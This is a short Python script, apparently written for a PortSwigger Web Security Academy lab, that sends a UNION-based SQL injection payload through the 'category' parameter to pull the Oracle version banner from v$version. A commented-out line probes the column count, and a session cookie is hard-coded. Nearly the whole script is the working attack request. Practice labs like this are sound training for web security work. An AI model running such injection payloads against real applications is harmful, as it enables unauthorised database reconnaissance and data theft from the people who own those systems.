#!/usr/bin/env python3

import urllib.parse
import requests

# SQL injection attack, querying the database type and version on Oracle

link = "https://acb91f281e541ff9c0bb850800730041.web-security-academy.net/filter?category=Gifts"
#chunk = "' UNION SELECT NULL,NULL FROM DUAL--" # number of columns
chunk = "' UNION SELECT NULL,banner FROM v$version--" # Oracle database version
url = link + urllib.parse.quote(chunk)

payload={}
headers = {
  'Cookie': 'session=wCb0daZFdioRSM84oixq5W1GpUtW2aO2'
}

response = requests.request("GET", url, headers=headers, data=payload)

print(url)
print(response.status_code)
